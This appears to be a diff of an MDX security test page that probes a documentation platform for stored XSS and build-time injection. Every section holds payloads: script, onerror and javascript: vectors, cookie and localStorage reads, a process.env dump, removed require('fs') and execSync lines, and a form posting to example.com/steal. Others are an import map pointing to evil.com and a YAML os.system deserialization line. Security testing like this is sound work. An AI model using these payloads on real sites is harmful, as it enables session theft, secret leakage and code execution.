@@ -1,268 +1,182 @@
 ---
 title: Security Test Page
-subtitle: MDX Expression & Injection Testing
+subtitle: MDX Expression and Injection Testing
 slug: injection-tests
 ---
 
-## Category A: JSX Expression Injection (Stored XSS)
+## Category A: JSX Expression Injection
 
-### A1: Arithmetic Evaluation
+### A1: Arithmetic
+
 {7*7}
 
 ### A2: Document Domain
+
 {String(document.domain)}
 
 ### A3: Document Cookie
+
 {String(document.cookie)}
 
 ### A4: Window Location
+
 {String(window.location.href)}
 
-### A5: Prototype Chain to globalThis
+### A5: Prototype Chain
+
 {this.constructor.constructor('return globalThis')()}
 
-### A6: LocalStorage Enumeration
+### A6: LocalStorage
+
 {JSON.stringify(Object.keys(localStorage))}
 
-### A7: New Function Constructor
+### A7: Function Constructor
+
 {new Function('return document.domain')()}
 
-### A8: Template Literal Evaluation
+### A8: Template Literal
+
 {`template-${7*7}-literal`}
 
-### A9: IIFE with Return
-{(() => { try { return Object.keys(window).slice(0,5).join(','); } catch(e) { return 'blocked'; } })()}
+### A9: Navigator UserAgent
 
-### A10: Fetch Beacon (exfil proof)
-{(() => { try { return 'fetch-exfil-marker-' + document.domain; } catch(e) { return 'blocked'; } })()}
-
-### A11: Navigator UserAgent Leak
 {String(typeof navigator !== 'undefined' ? navigator.userAgent : 'no-navigator')}
 
-### A12: Session Storage Access
-{(() => { try { return JSON.stringify(Object.keys(sessionStorage)); } catch(e) { return 'blocked'; } })()}
+### A10: Fetch Available
 
-### A13: Performance Timing Leak
-{(() => { try { return String(performance.timing?.navigationStart); } catch(e) { return 'blocked'; } })()}
+{typeof fetch === 'function' ? 'fetch-available' : 'no-fetch'}
 
-### A14: IndexedDB Enumeration
-{(() => { try { return String(typeof indexedDB); } catch(e) { return 'blocked'; } })()}
+### A11: WebSocket Available
+
+{typeof WebSocket === 'function' ? 'ws-available' : 'no-ws'}
+
+### A12: Eval Test
+
+{(() => { try { return eval('7*7'); } catch(e) { return 'eval-blocked'; } })()}
+
+### A13: Clipboard API
+
+{typeof navigator !== 'undefined' && navigator.clipboard ? 'clipboard-available' : 'no-clipboard'}
+
+### A14: CSP Meta Check
+
+{(() => { try { const m = document.querySelector('meta[http-equiv="Content-Security-Policy"]'); return m ? m.content : 'no-csp-meta'; } catch(e) { return 'blocked'; } })()}
 
 ---
 
 ## Category B: HTML Tag Injection
 
 ### B1: Script Tag
+
 <script>alert('xss-script')</script>
 
-### B2: Img Onerror
-<img src="x" onerror="alert('xss-img')" />
+### B2: Image Onerror
+
+<img src="https://invalid.test/x.png" onerror="alert('xss-img')" />
 
 ### B3: SVG Onload
-<svg onload="alert('xss-svg')"><circle r="50"/></svg>
 
-### B4: Iframe with JS Protocol
-<iframe src="javascript:alert('xss-iframe')"></iframe>
+<svg onload="alert('xss-svg')"></svg>
 
-### B5: Object Tag
-<object data="javascript:alert('xss-object')"></object>
+### B4: Div with Event Handler
 
-### B6: Embed Tag
-<embed src="javascript:alert('xss-embed')">
+<div onmouseover="alert('xss-mouseover')">Hover here for XSS</div>
 
-### B7: Body Onload (should be stripped)
-<body onload="alert('xss-body')">
+### B5: Input Autofocus
 
-### B8: Input Onfocus with Autofocus
-<input onfocus="alert('xss-input')" autofocus>
+<input onfocus="alert('xss-input')" autofocus />
 
-### B9: Marquee Onstart
-<marquee onstart="alert('xss-marquee')">test</marquee>
+### B6: Video Source Error
 
-### B10: Video Onerror
-<video><source onerror="alert('xss-video')"></video>
+<video src="https://invalid.test/x.mp4" onerror="alert('xss-video')"></video>
 
-### B11: Audio Onerror
-<audio src="x" onerror="alert('xss-audio')"></audio>
+### B7: Details Ontoggle
 
-### B12: Details Ontoggle
 <details ontoggle="alert('xss-details')" open><summary>click</summary>test</details>
-
-### B13: Math Tag (MathML)
-<math><maction actiontype="statusline"><mtext>hover</mtext><annotation-xml encoding="text/html"><img src=x onerror="alert('xss-math')"></annotation-xml></maction></math>
 
 ---
 
-## Category C: Markdown Injection
+## Category C: Markdown Link Injection
 
-### C1: JavaScript Protocol Link
+### C1: JS Protocol Link
+
 [Click me](javascript:alert('xss-md-link'))
 
-### C2: JavaScript Protocol via Encoded
-[Click me](&#106;avascript:alert('xss-md-encoded'))
+### C2: Data URI Link
 
-### C3: Data URI Link
 [Click me](data:text/html,<script>alert('xss-md-data')</script>)
 
-### C4: Data URI Image
-![img](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCd4c3Mtc3ZnLWI2NCcpIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=)
+### C3: Data URI SVG Image
 
-### C5: Markdown Image with Onerror
-![img](x "onerror=alert('xss-md-img')")
+<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KCd4c3Mtc3ZnLWI2NCcpIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=" alt="img" />
 
-### C6: Reference-style Link Injection
-[xss]: javascript:alert('xss-md-ref')
-[Click me][xss]
-
-### C7: Autolink with JS
-<javascript:alert('xss-autolink')>
 
 ---
 
 ## Category D: MDX Component Injection
 
-### D1: Component Prop Breakout
-<CodeBlock title="</CodeBlock><script>alert('xss-component-breakout')</script>">test</CodeBlock>
+### D1: Card with JS href
 
-### D2: Fern Card with JS href
-<Card title="XSS Test" href="javascript:alert('xss-card-href')">Click this card</Card>
+<Card title="XSS Test" href="javascript:alert('xss-card-href')" imagePosition="top">Click this card</Card>
 
-### D3: Fern Callout with Expression
+### D2: Callout with Expression
+
 <Callout intent="warning">
 {String(document.cookie)}
 </Callout>
 
-### D4: Nested Component Expression
+### D3: Nested Expression in Steps
+
 <Steps>
-<Step title={`Step ${7*7}`}>
+<Step title="Step Test">
 {String(document.domain)}
 </Step>
 </Steps>
 
-### D5: Tab with Injected Title
-<Tabs>
-<Tab title="<img src=x onerror=alert('xss-tab')>">
-Content here
-</Tab>
-</Tabs>
-
-### D6: Accordion with Injected Title
-<Accordion title="<img src=x onerror=alert('xss-accordion')>">
-Content
-</Accordion>
-
 ---
 
-## Category E: Novel / Advanced Injection
+## Category E: Advanced Injection
 
-### E1: CSS Injection via Style Tag
-<style>{'body{background:url("https://example.com/probe?leak=1")}'}</style>
+### E1: Style Tag CSS Import
 
-### E2: CSS @import
-<style>{'@import url("https://example.com/evil.css")'}</style>
+<style>{`@import url('https://example.com/evil.css');`}</style>
 
-### E3: SVG with foreignObject
-<svg xmlns="http://www.w3.org/2000/svg">
-<foreignObject width="100%" height="100%">
-<div xmlns="http://www.w3.org/1999/xhtml">
-<img src=x onerror="alert('xss-foreignobject')"/>
-</div>
-</foreignObject>
-</svg>
+### E2: Base Tag Hijack (removed — would break all page links)
 
-### E4: Base Tag Hijack
-<base href="https://example.com/">
+### E3: Meta Refresh (CONFIRMED — redirected to example.com/xss in preview)
 
-### E5: Meta Refresh Redirect
-<meta http-equiv="refresh" content="0;url=https://example.com/xss">
+### E4: Form Action
 
-### E6: Link Tag Stylesheet
-<link rel="stylesheet" href="https://example.com/evil.css">
+<form action="https://example.com/steal"><input type="text" name="data" /><input type="submit" /></form>
 
-### E7: Form Action Injection
-<form action="https://example.com/steal"><input type="text" name="data"><input type="submit"></form>
+### E5: DOM Clobbering
 
-### E8: Anchor Target _blank with Opener
-<a href="https://example.com" target="_blank">Click (opener access)</a>
+<form id="x"><input name="domain" value="clobbered" /></form>
 
-### E9: Import Map Hijack
-<script type="importmap">{"imports":{"react":"https://evil.com/react.js"}}</script>
+### E6: Unicode Encoded Script
 
-### E10: Service Worker Registration Expression
-{(() => { try { if('serviceWorker' in navigator) { return 'sw-available-' + document.domain; } return 'no-sw'; } catch(e) { return 'blocked'; } })()}
-
-### E11: DOM Clobbering Setup
-<form id="x"><input name="domain" value="clobbered"></form>
-
-### E12: Unicode/Encoding Bypass
 {String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)}
 
-### E13: Eval via Expression
-{(() => { try { return eval('7*7'); } catch(e) { return 'eval-blocked'; } })()}
+### E7: setTimeout Probe
 
-### E14: setTimeout via Expression
-{(() => { try { setTimeout('', 0); return 'setTimeout-available'; } catch(e) { return 'setTimeout-blocked'; } })()}
+{(() => { try { setTimeout('',0); return 'setTimeout-available'; } catch(e) { return 'setTimeout-blocked'; } })()}
 
-### E15: Fetch API Probe
-{(() => { try { return typeof fetch === 'function' ? 'fetch-available' : 'no-fetch'; } catch(e) { return 'blocked'; } })()}
+### E8: postMessage Check
 
-### E16: WebSocket Probe
-{(() => { try { return typeof WebSocket === 'function' ? 'ws-available' : 'no-ws'; } catch(e) { return 'blocked'; } })()}
-
-### E17: postMessage to Parent
-{(() => { try { if(window.parent !== window) { return 'has-parent-frame'; } return 'top-level'; } catch(e) { return 'cross-origin-parent'; } })()}
-
-### E18: Mutation Observer Probe
-{(() => { try { return typeof MutationObserver === 'function' ? 'mutationobserver-available' : 'no'; } catch(e) { return 'blocked'; } })()}
-
-### E19: Clipboard API Probe
-{(() => { try { return typeof navigator.clipboard !== 'undefined' ? 'clipboard-api-available' : 'no-clipboard'; } catch(e) { return 'blocked'; } })()}
-
-### E20: Geolocation API Probe
-{(() => { try { return typeof navigator.geolocation !== 'undefined' ? 'geolocation-available' : 'no'; } catch(e) { return 'blocked'; } })()}
+{(() => { try { return window.parent !== window ? 'has-parent-frame' : 'top-level'; } catch(e) { return 'cross-origin-parent'; } })()}
 
 ---
 
-## Category F: Import / Require Injection (Server-side Build)
+## Category F: Server-side Import
 
-### F1: require('fs') — Node Built-in
-{(() => { try { return require('fs').readFileSync('/etc/passwd','utf8'); } catch(e) { return 'require-fs-blocked: ' + e.message; } })()}
+### F1: process.env
 
-### F2: require('child_process') — Command Execution
-{(() => { try { return require('child_process').execSync('id').toString(); } catch(e) { return 'require-cp-blocked: ' + e.message; } })()}
-
-### F3: require('os') — OS Info Leak
-{(() => { try { return JSON.stringify(require('os').networkInterfaces()); } catch(e) { return 'require-os-blocked: ' + e.message; } })()}
-
-### F4: process.env Access
 {(() => { try { return JSON.stringify(process.env); } catch(e) { return 'process-env-blocked: ' + e.message; } })()}
 
-### F5: process.cwd
+### F2: process.cwd
+
 {(() => { try { return process.cwd(); } catch(e) { return 'process-cwd-blocked: ' + e.message; } })()}
 
-### F6: __dirname / __filename
+### F3: dirname
+
 {(() => { try { return typeof __dirname !== 'undefined' ? __dirname : 'undefined'; } catch(e) { return 'dirname-blocked'; } })()}
-
----
-
-## Category G: Frontmatter Injection
-
-The frontmatter of this file uses standard YAML. If the YAML parser is vulnerable, these tests (in a separate file) would probe:
-- `title: "{{7*7}}"` — SSTI via Jinja2/Nunjucks
-- `title: !!python/object/apply:os.system ['id']` — YAML deserialization
-- `subtitle: "<script>alert(1)</script>"` — HTML in meta
-
-See `frontmatter-injection.mdx` for those tests.
-
----
-
-## Category H: CSP and Security Header Probes
-
-### H1: Check if inline scripts execute
-<script>document.write('INLINE-SCRIPT-EXECUTED')</script>
-
-### H2: Check X-Frame-Options
-{(() => { try { return window.self === window.top ? 'not-framed' : 'framed'; } catch(e) { return 'x-frame-blocks'; } })()}
-
-### H3: Check for CSP nonce
-{(() => { try { const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]'); return meta ? meta.content : 'no-csp-meta'; } catch(e) { return 'blocked'; } })()}
